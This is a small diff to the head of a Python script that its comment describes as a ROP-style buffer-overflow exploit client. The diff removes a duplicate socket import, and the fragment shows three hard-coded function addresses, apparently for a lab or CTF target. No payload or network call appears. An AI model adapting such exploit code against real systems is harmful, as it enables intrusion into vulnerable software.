@@ -1,6 +1,5 @@
 import socket
 #simply ROP type bufferoverflow with SFP client
-import socket
 f3=0x8049e0b #adresses of functions
 f2=0x8049dd8
 f1=0x8049da5
